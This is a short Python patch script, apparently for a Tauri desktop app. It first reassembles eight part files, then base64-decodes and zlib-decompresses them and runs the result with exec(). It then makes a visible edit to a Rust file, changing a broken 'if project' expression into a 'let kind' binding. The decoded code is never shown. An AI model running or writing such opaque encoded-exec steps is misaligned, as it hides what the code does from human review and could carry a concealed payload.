from pathlib import Path
import base64
import zlib
payload = ''.join(Path(f'scripts/pr46_patch.part{i}').read_text() for i in range(8))
exec(zlib.decompress(base64.b64decode(payload)).decode())
p = Path('apps/desktop/src-tauri/src/workspace/bulk_model.rs')
text = p.read_text()
bad = '''                        if project\n                            .element(id)\n                            .map_err(|cause| {\n                                error("SEMANTIC_VALIDATION", Some(index), cause.to_string())\n                            })?\n                            .kind\n                            .clone();\n                        if !matches!(kind, ElementKind::ValueProperty | ElementKind::Parameter) {\n'''
good = '''                        let kind = project\n                            .element(id)\n                            .map_err(|cause| {\n                                error("SEMANTIC_VALIDATION", Some(index), cause.to_string())\n                            })?\n                            .kind\n                            .clone();\n                        if !matches!(kind, ElementKind::ValueProperty | ElementKind::Parameter) {\n'''
if bad not in text:
    raise SystemExit('missing post-patch default-value anchor')
p.write_text(text.replace(bad, good, 1))
